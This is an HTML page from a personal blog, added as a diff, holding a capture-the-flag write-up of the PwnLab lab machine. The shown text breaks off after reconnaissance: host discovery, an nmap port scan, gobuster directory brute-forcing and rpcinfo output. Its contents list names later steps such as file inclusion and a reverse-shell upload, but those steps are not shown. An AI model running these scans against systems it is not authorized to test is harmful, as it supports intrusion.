@@ -1,0 +1,1434 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CTF PwnLab | Peanutstick</title>
+  <meta name="keywords" content=" Linux ">
+  <meta name="description" content="CTF PwnLab | Peanutstick">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="&#x2F;etc&#x2F;hosts10.10.11.124 shibboleth.htb nmapnmap -sV shibboleth.htb  PORT STATE SERVICE VERSION  80&#x2F;tcp open http Apache httpd 2.4.41 We only have an apache server. gobustergobuster dir -t 100 -u h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF Shibboleth">
+<meta property="og:url" content="http://peanutstick.duckdns.org/post/CTF_Shibboleth.html">
+<meta property="og:site_name" content="Peanutstick">
+<meta property="og:description" content="&#x2F;etc&#x2F;hosts10.10.11.124 shibboleth.htb nmapnmap -sV shibboleth.htb  PORT STATE SERVICE VERSION  80&#x2F;tcp open http Apache httpd 2.4.41 We only have an apache server. gobustergobuster dir -t 100 -u h">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/hwLrBG4.png">
+<meta property="og:image" content="https://i.imgur.com/JjPUFhl.png">
+<meta property="og:image" content="https://i.imgur.com/wwNadhq.png">
+<meta property="og:image" content="https://i.imgur.com/tvZYZ5i.png">
+<meta property="og:image" content="https://i.imgur.com/T4SLwub.png">
+<meta property="og:image" content="https://i.imgur.com/NjeFyWU.png">
+<meta property="og:image" content="https://i.imgur.com/KsbCPG0.png">
+<meta property="og:image" content="https://i.imgur.com/yDEBpLw.png">
+<meta property="og:image" content="https://i.imgur.com/RsOO332.png">
+<meta property="article:published_time" content="2022-03-12T23:29:02.000Z">
+<meta property="article:modified_time" content="2022-03-16T18:07:17.510Z">
+<meta property="article:author" content="Peanutstick">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/hwLrBG4.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+<script id="dsq-count-scr" src="//peanutstick.disqus.com/count.js" async></script>
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="true">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Peanutstick</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/Peanutstick"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            <a title="reddit"
+               href="https://www.reddit.com/user/benjy500c/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-reddit"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(61)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="CTF">
+                        
+                        CTF
+                        <small>(23)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Fix">
+                        
+                        Fix
+                        <small>(5)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Os">
+                        
+                        Os
+                        <small>(17)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Other">
+                        
+                        Other
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Programing">
+                        
+                        Programing
+                        <small>(3)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Security">
+                        
+                        Security
+                        <small>(3)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Service">
+                        
+                        Service
+                        <small>(5)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Tips">
+                        
+                        Tips
+                        <small>(4)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="61">
+<input type="hidden" id="yelog_site_word_count" value="28.3k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://irc.evilcorp.ga/">Evilcorp</a></li>
+            
+            <li><a target="_blank" href="https://github.com/TripleZer000">TripleZer0</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">Contents</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>IRC Python</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux, Gaming</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Pentest</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Security</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Tor</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>VPN</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="All CTF "
+           href="/post/CTF_Shibboleth.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Shibboleth">CTF Shibboleth</span>
+            <span class="post-date" title="2022-03-13 00:29:02">2022/03/13</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_PwnLab.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF PwnLab">CTF PwnLab</span>
+            <span class="post-date" title="2022-03-06 04:07:56">2022/03/06</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Simple_CTF.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF simple CTF">CTF simple CTF</span>
+            <span class="post-date" title="2022-03-03 01:20:52">2022/03/03</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_hacker_kid.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF hacker kid">CTF hacker kid</span>
+            <span class="post-date" title="2022-02-28 03:19:25">2022/02/28</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/How_to_gain_some_GiB_on_Arch_Linux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="How to gain some GiB on Arch Linux">How to gain some GiB on Arch Linux</span>
+            <span class="post-date" title="2022-02-21 03:15:52">2022/02/21</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_jordaninfosec.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Jordaninfosec">CTF Jordaninfosec</span>
+            <span class="post-date" title="2022-02-17 22:11:00">2022/02/17</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Deathnote.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Deathnote">CTF Deathnote</span>
+            <span class="post-date" title="2022-02-08 02:20:57">2022/02/08</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Paper.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Paper">CTF Paper</span>
+            <span class="post-date" title="2022-02-06 04:07:56">2022/02/06</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Pandora.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Pandora">CTF Pandora</span>
+            <span class="post-date" title="2022-02-05 01:30:52">2022/02/05</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Meta.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Meta">CTF Meta</span>
+            <span class="post-date" title="2022-02-02 03:15:02">2022/02/02</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Secret.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Secret">CTF Secret</span>
+            <span class="post-date" title="2022-01-31 00:29:02">2022/01/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Backdoor.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Backdoor">CTF Backdoor</span>
+            <span class="post-date" title="2022-01-29 22:19:25">2022/01/29</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Horizontall.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Horizontall">CTF Horizontall</span>
+            <span class="post-date" title="2022-01-23 20:42:51">2022/01/23</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Toppo.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Toppo">CTF Toppo</span>
+            <span class="post-date" title="2022-01-22 17:54:42">2022/01/22</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Walpaper_selector_with_sxiv.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Wallpaper selector with sxiv">Wallpaper selector with sxiv</span>
+            <span class="post-date" title="2022-01-22 02:35:56">2022/01/22</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_cybersploit.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF cybersploit">CTF cybersploit</span>
+            <span class="post-date" title="2022-01-21 20:19:23">2022/01/21</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_unknowndevice64-1.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF unknowndevice64-1">CTF unknowndevice64-1</span>
+            <span class="post-date" title="2022-01-19 20:51:42">2022/01/19</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Record_screen_with_ffmpeg.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Record screen with ffmpeg">Record screen with ffmpeg</span>
+            <span class="post-date" title="2022-01-19 01:56:09">2022/01/19</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_commands_and_files.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF commands and files">CTF commands and files</span>
+            <span class="post-date" title="2022-01-17 22:55:38">2022/01/17</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/set_up_smb.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="set up smb">set up smb</span>
+            <span class="post-date" title="2022-01-16 05:01:27">2022/01/16</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Stapler.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Stapler">CTF Stapler</span>
+            <span class="post-date" title="2022-01-15 01:07:29">2022/01/15</span>
+        </a>
+        
+        <a  class="All Programing "
+           href="/post/Create_a_polybar_module.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Create a polybar module">Create a polybar module</span>
+            <span class="post-date" title="2022-01-12 23:09:01">2022/01/12</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Replacing_xfce4_bar_by_Polybar.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Replacing xfce4 bar by Polybar">Replacing xfce4 bar by Polybar</span>
+            <span class="post-date" title="2022-01-12 00:57:59">2022/01/12</span>
+        </a>
+        
+        <a  class="All Programing "
+           href="/post/Script_to_create_my_article_page.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Script to create my article page.">Script to create my article page.</span>
+            <span class="post-date" title="2022-01-11 22:30:34">2022/01/11</span>
+        </a>
+        
+        <a  class="All Other "
+           href="/post/Cut_an_online_video_with_ffmpeg.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Cut an online video with ffmpeg">Cut an online video with ffmpeg</span>
+            <span class="post-date" title="2022-01-11 03:15:52">2022/01/11</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/Stream_audio_video_at_home.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Create a locale stream">Create a locale stream</span>
+            <span class="post-date" title="2022-01-09 19:18:22">2022/01/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_SickOs.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF_SickOs">CTF_SickOs</span>
+            <span class="post-date" title="2022-01-09 01:15:52">2022/01/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Dina.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Dinae">CTF Dinae</span>
+            <span class="post-date" title="2022-01-08 22:16:52">2022/01/08</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/weather.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Weather in CLI">Weather in CLI</span>
+            <span class="post-date" title="2022-01-06 18:15:52">2022/01/06</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/switch_from_i3_to_bspwm.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Switch from i3 to bspwm">Switch from i3 to bspwm</span>
+            <span class="post-date" title="2022-01-01 01:37:52">2022/01/01</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Fix_teams.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Fix my spyware is stuck in the login loop (Microsoft teams)">Fix my spyware is stuck in the login loop (Microsoft teams)</span>
+            <span class="post-date" title="2021-12-27 21:15:52">2021/12/27</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/nitrogen_with_wal.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="How do I setup nitrogen &amp; pywal">How do I setup nitrogen &amp; pywal</span>
+            <span class="post-date" title="2021-12-25 03:15:52">2021/12/25</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Setup_Xfce_with_i3.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Setup_Xfce_with_i3">Setup_Xfce_with_i3</span>
+            <span class="post-date" title="2021-12-24 05:17:00">2021/12/24</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Set_firewall_ufw.html"
+           data-tag="Security"
+           data-author="" >
+            <span class="post-title" title="Set up a firewall with ufw">Set up a firewall with ufw</span>
+            <span class="post-date" title="2021-11-01 20:05:52">2021/11/01</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Port_knocking.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Set up port knocking server to hide an open port">Set up port knocking server to hide an open port</span>
+            <span class="post-date" title="2021-10-31 01:15:52">2021/10/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Tr0ll.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Tr0ll">CTF Tr0ll</span>
+            <span class="post-date" title="2021-10-02 01:15:52">2021/10/02</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Run_games_on_lutris_with_proton.html"
+           data-tag="Linux, Gaming"
+           data-author="" >
+            <span class="post-title" title="Run non steam game with proton on lutris">Run non steam game with proton on lutris</span>
+            <span class="post-date" title="2021-09-15 04:40:52">2021/09/15</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Add-windows-to-grub.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Add windows to grub">Add windows to grub</span>
+            <span class="post-date" title="2021-08-28 07:54:52">2021/08/28</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/gparted.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Resize the main partion with gparted">Resize the main partion with gparted</span>
+            <span class="post-date" title="2021-08-27 17:08:52">2021/08/27</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/cheat-sheet.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Cheat Sheet of the commands I use">Cheat Sheet of the commands I use</span>
+            <span class="post-date" title="2021-08-08 17:15:52">2021/08/08</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Set_polybar_on_2_screen.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Set Polybar on 2 screens">Set Polybar on 2 screens</span>
+            <span class="post-date" title="2021-08-08 04:15:52">2021/08/08</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Ted.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Ted">CTF Ted</span>
+            <span class="post-date" title="2021-08-08 04:15:52">2021/08/08</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Change_screen_resolution.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Change screen resolution with xandr">Change screen resolution with xandr</span>
+            <span class="post-date" title="2021-08-02 04:15:52">2021/08/02</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Low_fps_in_games.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="My games are unplayable">My games are unplayable</span>
+            <span class="post-date" title="2021-08-01 19:15:52">2021/08/01</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Set_shortcut_for_brightness.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Set shortcut with i3 for brightness.">Set shortcut with i3 for brightness.</span>
+            <span class="post-date" title="2021-07-31 20:23:52">2021/07/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Inferno.html"
+           data-tag="Pentest"
+           data-author="" >
+            <span class="post-title" title="CTF Inferno">CTF Inferno</span>
+            <span class="post-date" title="2021-07-19 18:59:52">2021/07/19</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Fix_picom_blur_not_working.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Fix the blur with picom">Fix the blur with picom</span>
+            <span class="post-date" title="2021-07-18 22:40:52">2021/07/18</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Configure_touchpad_on_i3.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Configure the touchpad [I3]">Configure the touchpad [I3]</span>
+            <span class="post-date" title="2021-07-16 02:16:52">2021/07/16</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/Send_file_via_ssh.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Send a file via ssh">Send a file via ssh</span>
+            <span class="post-date" title="2021-07-14 04:15:52">2021/07/14</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Install-nvidia-driver.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Install nvidia driver on Arch Linux">Install nvidia driver on Arch Linux</span>
+            <span class="post-date" title="2021-07-13 17:48:52">2021/07/13</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Restore-backup.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Restore a backup with timeshift">Restore a backup with timeshift</span>
+            <span class="post-date" title="2021-07-12 01:59:52">2021/07/12</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Repare-wine.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="wine: could not load kernel32.dll, status c0000135">wine: could not load kernel32.dll, status c0000135</span>
+            <span class="post-date" title="2021-07-11 18:50:52">2021/07/11</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Create_new_partition_linux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Add a partition in linux">Add a partition in linux</span>
+            <span class="post-date" title="2021-07-11 03:06:52">2021/07/11</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Save-Arch-linux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Get a shell when Arch Linux is broken">Get a shell when Arch Linux is broken</span>
+            <span class="post-date" title="2021-07-07 06:55:56">2021/07/07</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Install-AUR-packages.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Installing AUR packages">Installing AUR packages</span>
+            <span class="post-date" title="2021-07-04 13:45:52">2021/07/04</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Install-ArchLinux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Arch Linux installation guide">Arch Linux installation guide</span>
+            <span class="post-date" title="2021-07-01 04:15:52">2021/07/01</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_gigachad.html"
+           data-tag="Pentest"
+           data-author="" >
+            <span class="post-title" title="CTF-gigachad">CTF-gigachad</span>
+            <span class="post-date" title="2021-07-01 04:15:52">2021/07/01</span>
+        </a>
+        
+        <a  class="All Programing "
+           href="/post/Create-an-IRC-bot-with-python.html"
+           data-tag="IRC Python"
+           data-author="" >
+            <span class="post-title" title="Create an IRC bot with python">Create an IRC bot with python</span>
+            <span class="post-date" title="2021-06-21 21:25:10">2021/06/21</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/openVPN.html"
+           data-tag="VPN"
+           data-author="" >
+            <span class="post-title" title="OpenVPN">OpenVPN</span>
+            <span class="post-date" title="2021-06-20 17:53:11">2021/06/20</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/Relais-tor.html"
+           data-tag="Tor"
+           data-author="" >
+            <span class="post-title" title="Création d&#39;un relais tor avec debian 10">Création d&#39;un relais tor avec debian 10</span>
+            <span class="post-date" title="2021-04-09 13:45:52">2021/04/09</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Secu-apache.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Securing an apache server">Securing an apache server</span>
+            <span class="post-date" title="2021-03-09 12:45:52">2021/03/09</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-CTF_PwnLab" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">CTF PwnLab</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">Linux</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2022-03-10 18:37:35'>2022-03-06 04:07</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:1.3k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#netdiscover"><span class="toc-text">netdiscover</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#port-80"><span class="toc-text">port 80</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gobuster"><span class="toc-text">gobuster</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#port-111"><span class="toc-text">port 111</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql"><span class="toc-text">Mysql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-80-LFI"><span class="toc-text">Port 80 LFI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql-1"><span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Browse-the-database"><span class="toc-text">Browse the database</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Decode-the-hash"><span class="toc-text">Decode the hash</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Upload-a-revershell"><span class="toc-text">Upload a revershell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Connect-as-kane"><span class="toc-text">Connect as kane</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h1><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo netdiscover<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.imgur.com/cLIp58i.png"><br>192.168.0.29</p>
+<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">nmap -sV 192.168.0.29 -p- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.imgur.com/g3Enwl2.png"><br>80, 11, 3306, 33795</p>
+<h1 id="port-80"><a href="#port-80" class="headerlink" title="port 80"></a>port 80</h1><h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">gobuster dir -t 100 -u http:&#x2F;&#x2F;192.168.0.29&#x2F; -w ~&#x2F;Documents&#x2F;wordlist&#x2F;directory-list-medium.txt
+
+&#x2F;upload               (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.29&#x2F;upload&#x2F;]
+&#x2F;images               (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;192.168.0.29&#x2F;images&#x2F;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/ldl7eWg.png"></p>
+<h1 id="port-111"><a href="#port-111" class="headerlink" title="port 111"></a>port 111</h1><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo nmap -sSUC -p111 192.168.0.29
+
+PORT    STATE SERVICE
+111&#x2F;tcp open  rpcbind
+| rpcinfo: 
+|   program version    port&#x2F;proto  service
+|   100000  2,3,4        111&#x2F;tcp   rpcbind
+|   100000  2,3,4        111&#x2F;udp   rpcbind
+|   100000  3,4          111&#x2F;tcp6  rpcbind
+|   100000  3,4          111&#x2F;udp6  rpcbind
+|   100024  1          33795&#x2F;tcp   status
+|   100024  1          44347&#x2F;udp6  status
+|   100024  1          50459&#x2F;tcp6  status
